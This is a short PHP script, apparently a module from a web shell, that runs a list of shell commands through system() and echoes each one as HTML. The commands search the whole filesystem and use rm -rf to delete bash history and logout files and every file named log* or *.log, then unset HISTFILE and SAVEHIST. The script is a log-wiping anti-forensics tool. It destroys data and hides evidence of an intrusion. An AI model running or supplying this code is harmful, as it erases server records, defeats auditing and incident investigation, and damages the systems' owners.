<?php
$comandos = array('find / -name *.bash_history -exec rm -rf {} \;', 'find / -name *.bash_logout -exec rm -rf {} \;', 'find / -name log* -exec rm -rf {} \;', 'find / -name  *.log -exec rm -rf {} \;', 'unset HISTFILE', 'unset SAVEHIST');
foreach($comandos as $comando) {
    echo "<b>Loading command : </b>" . $comando . "<br>";
    system($comando);
}
echo "<center>";
?>